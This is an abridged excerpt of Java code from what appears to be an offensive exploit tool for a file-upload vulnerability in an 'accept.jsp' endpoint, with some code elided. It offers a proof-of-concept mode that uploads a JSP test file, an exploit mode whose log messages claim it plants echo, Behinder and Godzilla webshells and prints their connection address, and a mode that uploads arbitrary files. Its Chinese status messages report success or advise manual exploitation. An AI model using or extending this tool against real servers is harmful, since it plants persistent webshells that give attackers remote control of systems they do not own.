    ...
    public void exploit() throws IOException {
        try {
            ...
            if (Config.MOD.equals("poc")) {
                fileWriter.write("<% out.println(\"yyds\"); %>");
            ...
            if (responseCode1 == HttpURLConnection.HTTP_OK) {
                ...
                if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(pocFlag) && Config.MOD.equals("poc")) {
                    logMessage("[+] accept.jsp 文件上传漏洞存在, 成功上传测试文件: " + Config.TARGET + "/" + fileName);
                    ...
                    logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + Config.TARGET + "/" + fileName + "\n[+] 请求头与连接密码见 README.md.");
                } else if ((responseCode2 != HttpURLConnection.HTTP_OK || !responseText2.contains(expFlag)) && Config.MOD.equals("exp")) {
                    logMessage("[-] 文件上传失败, 请尝试手动利用.");
                } else if (responseCode2 == HttpURLConnection.HTTP_OK && Config.MOD.equals("upload")) {
                    logMessage("[+] 文件上传成功! 文件地址: " + Config.TARGET + "/" + fileName);
                } else if (responseCode2 != HttpURLConnection.HTTP_OK && Config.MOD.equals("upload")) {
                    logMessage("[-] 文件上传失败, 请尝试手动利用.");
                }
            } else {
            ...
            logMessage("[-] accept.jsp 文件上传异常. " + e.toString());
        }
    }
}
